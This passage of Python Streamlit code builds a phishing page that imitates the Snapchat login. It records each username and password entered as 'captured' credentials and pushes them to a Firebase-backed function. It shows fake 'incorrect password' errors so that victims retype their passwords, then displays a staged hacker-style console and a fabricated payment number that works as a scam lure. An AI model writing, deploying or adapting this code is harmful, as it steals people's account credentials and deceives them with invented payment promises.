        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
